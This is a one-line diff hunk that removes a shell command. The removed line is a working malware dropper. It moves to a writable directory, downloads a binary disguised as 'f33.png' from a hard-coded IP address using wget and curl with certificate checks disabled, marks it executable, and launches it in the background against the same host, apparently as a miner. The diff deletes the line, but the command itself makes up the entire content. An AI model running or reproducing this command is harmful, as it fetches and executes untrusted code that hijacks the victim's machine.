@@ -1,1 +1,0 @@
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://77.90.185.76/f33.png; curl --insecure -O http://77.90.185.76/f33.png; chmod +x *; nohup ./f33.png -o 77.90.185.76:110 -B & > /dev/null &
